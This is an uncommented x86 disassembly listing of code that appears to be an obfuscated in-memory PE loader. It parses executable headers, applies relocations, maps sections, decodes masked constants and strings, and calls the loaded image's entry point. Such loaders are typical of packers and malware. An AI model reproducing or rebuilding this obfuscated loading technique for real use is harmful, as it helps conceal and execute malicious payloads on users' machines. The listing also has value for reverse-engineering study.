  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
